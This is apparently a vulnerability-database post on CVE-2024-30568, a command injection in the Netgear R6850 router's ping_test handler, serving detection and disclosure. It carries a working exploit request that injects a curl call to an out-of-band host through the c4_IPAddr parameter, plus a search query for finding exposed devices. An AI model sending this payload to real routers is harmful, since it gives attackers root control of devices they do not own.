---
layout: post
cve_id: CVE-2024-30568
title: Netgear R6850 V1.1.0.88 - Command Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-30568.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-30568.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Attackers can execute arbitrary commands on the router, leading to complete
  device compromise.

  '
remediation: 'Update Netgear R6850 firmware to a version that patches the command
  injection vulnerability.

  '
reference:
- https://github.com/funny-mud-peee/IoT-vuls/blob/main/netgear%20R6850/Netgear-R6850%20V1.1.0.88%20Command%20Injection(ping_test).md
- https://nvd.nist.gov/vuln/detail/CVE-2024-30568
- https://www.netgear.com/about/security/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-30568
  cwe-id: CWE-94
  epss-score: 0.90809
  epss-percentile: 0.99603
metadata:
  verified: true
  max-request: 1
  product: Netgear R6850 Router
  vendor: Netgear
  version: V1.1.0.88
  fofa-query: app="NETGEAR" && "R6850"
tags:
- cve
- cve2024
- cve2024-30568
- netgear
- router
- rce
- oast
- iot
- rce
- command-injection
- vuln
---

## üîç Vulnerability Description
Netgear R6850 router firmware version V1.1.0.88 suffers from a command injection vulnerability in the ping_test functionality. An unauthenticated attacker can inject arbitrary system commands through the c4_IPAddr parameter, resulting in remote code execution as root.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.16
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /setup.cgi?id=0&sp=1337 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15
Connection: close
Content-Length: 109
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

todo=ping_test&c4_IPAddr=127.0.0.1 && curl d5jjihple0o4g21dhakg1ezkgcae5rw6m.oast.site&next_file=diagping.htm
```

